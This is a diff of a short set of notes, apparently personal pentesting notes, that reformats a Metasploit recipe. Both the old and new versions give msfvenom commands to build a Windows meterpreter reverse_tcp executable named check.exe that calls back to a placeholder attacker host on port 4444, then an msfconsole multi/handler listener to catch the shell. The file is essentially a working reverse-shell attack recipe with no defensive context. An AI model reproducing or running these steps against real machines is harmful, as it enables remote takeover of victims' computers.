@@ -1,10 +1,18 @@
-service postgresql start
-use 
-msfvenom -p windows/meterpreter/reverse_tcp -a x86_64 --platform windows LHOST=attackerip LPORT=4444 -f exe > check.exe
+Start postgresql service:
 
-msfconsole
-	use exploit/multi/handler
-	set PAYLOAD windows/meterpreter/reverse_tcp
-	set LHOST attackerip
-	set LPORT 4444
-	exploitmsf
+	service postgresql start
+
+Create the payload 
+
+	msfvenom -p windows/meterpreter/reverse_tcp -a x86_64 --platform windows LHOST=attackerip LPORT=4444 -f exe > check.exe
+
+Start payload listener
+
+	msfconsole
+		use exploit/multi/handler
+		set PAYLOAD windows/meterpreter/reverse_tcp
+		set LHOST attackerip
+		set LPORT 4444
+		exploit
+	
+
